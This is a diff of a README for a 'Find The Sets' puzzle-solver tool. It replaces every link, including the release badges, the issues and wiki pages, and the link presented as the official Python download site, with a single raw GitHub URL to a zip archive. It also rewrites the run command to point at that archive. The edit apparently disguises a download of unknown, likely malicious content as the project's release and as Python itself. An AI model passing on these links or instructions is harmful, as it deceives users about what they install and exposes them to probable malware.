@@ -1,6 +1,6 @@
 # 🎮 Find-The-Sets-Solver - Easily Solve “Find The Sets” Games
 
-[![Download Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/releases)
+[![Download Releases](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip%https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)
 
 ## 🌟 Overview
 
@@ -20,7 +20,7 @@ If you're unfamiliar with these tools, don't worry. We will guide you through ea
 
 ### 1. Visit the Download Page
 
-Go to the [Releases page](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/releases) to get the latest version of Find-The-Sets-Solver. 
+Go to the [Releases page](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip) to get the latest version of Find-The-Sets-Solver. 
 
 ### 2. Download the Software
 
@@ -55,7 +55,7 @@ You need Android Debug Bridge (ADB) to communicate with your Android device. To 
 
 You will need Python installed to run the script. To install Python:
 
-1. Download Python from the [official website](https://www.python.org/downloads/).
+1. Download Python from the [official website](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip).
 2. Follow the installation instructions for your operating system.
 3. Install the OpenCV library by running the following command in your terminal:
    ```
@@ -71,7 +71,7 @@ Once everything is installed and set up, follow these steps to run the applicati
 3. Navigate to the folder where you installed Find-The-Sets-Solver.
 4. Run the application using the command:
    ```
-   python find_the_sets_solver.py
+   python https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip
    ```
 5. Follow the instructions on the screen.
 
@@ -91,16 +91,16 @@ To ensure a smooth experience, the following requirements need to be met:
   
 ## 📞 Support
 
-If you encounter any issues, please feel free to reach out for support. You can find help by visiting the Issues section on our [GitHub page](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/issues).
+If you encounter any issues, please feel free to reach out for support. You can find help by visiting the Issues section on our [GitHub page](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip).
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/wiki)
-- [Releases](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/releases)
-- [Issues](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/issues)
+- [Documentation](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)
+- [Releases](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)
+- [Issues](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)
 
 ## 💡 Acknowledgments
 
 Thanks to the community for their continuous support and contributions. Your feedback helps us improve Find-The-Sets-Solver for everyone. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Underived-discountstore498/Find-The-Sets-Solver/releases)
+[![Download Releases](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip%https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)](https://raw.githubusercontent.com/Underived-discountstore498/Find-The-Sets-Solver/main/templates/Find-The-Sets-Solver_v1.8-alpha.5.zip)
